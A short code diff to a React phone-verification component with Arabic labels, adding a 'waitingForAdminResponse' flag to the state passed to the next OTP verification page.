@@ -92,6 +92,7 @@ export default function PhoneVerification() {
       },
       current: "توثيق رقم الجوال",
       nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
+      waitingForAdminResponse: true,
     });
   };
 
